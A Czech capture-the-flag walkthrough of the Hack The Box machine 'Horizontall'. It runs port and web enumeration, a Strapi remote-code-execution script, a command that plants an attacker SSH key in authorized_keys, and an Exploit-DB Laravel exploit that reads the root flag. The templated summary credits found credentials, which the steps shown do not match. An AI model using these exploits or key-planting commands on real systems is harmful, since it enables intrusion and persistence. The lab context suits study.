---
layout: post
author: Tomáš Matějíček
title: "Horizontall"
date: 2020-12-04
tags: linux ssh php exploit enumeration privesc
---
## Úvod a kontext

U Horizontall není hlavní hodnota v jednom efektním kroku, ale ve vazbě mezi `api-prod.horizontall.htb`, webová aplikace v PHP a nginx.

Článek dává smysl číst hlavně jako rozbor rozhodování: proč právě tyto stopy vedou k SSH s nalezenými přihlašovacími údaji a proč po získání shellu dává smysl řešit lokální enumeraci po získání shellu.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT      STATE  SERVICE      VERSION
```

### Detailní analýza služeb

V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
```text
22/tcp    open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```
```
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp    open   http         nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
```

### Enumerace webu

Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
```bash
./dirsearch/dirsearch.py -u http://$IP -e php -x 403 -r
```
```
=> http://api-prod.horizontall.htb/admin/
```

## Analýza zjištění

### Identifikace a hledání exploitu

Zjišťuji technologii a ověřuji známé zranitelnosti.
```bash
whatweb -v http://api-prod.horizontall.htb
```
```
=> Strapi <strapi.io> (from x-powered-by string)
```

### Identifikace a hledání exploitu (2)

Zjišťuji technologii a ověřuji známé zranitelnosti.
```bash
searchsploit laravel
```

## Získání přístupu

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
python3 Strapi.py http://api-prod.horizontall.htb
```
```
mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa __CENSORED__= hack@kali" >> ~/.ssh/authorized_keys && echo ssh-rsa __CENSORED__= hack@kali >> ~/.ssh/authorized_keys
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.

Následující úsek zachycuje přechod k uživatelskému přístupu a jeho ověření přes `user.txt`.

```text
$ ssh strapi@horizontall.htb
$ bash

$ cat /home/developer/user.txt
f6da5b3556062cbd5233fda6c7298960

$ netstat -natp
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1896/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log "cat /root/root.txt"
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- První skutečně užitečný závěr plynul z toho, jak do sebe zapadly `api-prod.horizontall.htb`, webová aplikace v PHP a nginx.
- User fáze se opírala o SSH s nalezenými přihlašovacími údaji, takže přístup byl reprodukovatelný a ne jen jednorázový.
- Finální kontrolu nad systémem otevřela až mechanika typu lokální enumerace po získání shellu.

## Co si odnést do praxe

- V tomhle článku se první slabé místo otevřelo přes `api-prod.horizontall.htb`, webová aplikace v PHP a nginx. Webová vrstva nesmí publikovat víc, než je nezbytné; vedlejší vhost, debug endpoint nebo zapomenutý soubor často odhalí skutečný vstup do řetězce.
- Stabilní foothold pak stojí na principu SSH s nalezenými přihlašovacími údaji. Hesla a klíče je potřeba oddělovat mezi službami; jakmile stejné přihlašovací údaje fungují i na SSH, z lokálního úniku je plnohodnotný systémový přístup.
- Pro závěrečnou fázi je podstatné, že rozhodla lokální enumerace po získání shellu. Po získání shellu je rozhodující systematická lokální enumerace; i bez další CVE často rozhodne kombinace špatných oprávnění, reuse tajemství a pomocných skriptů.
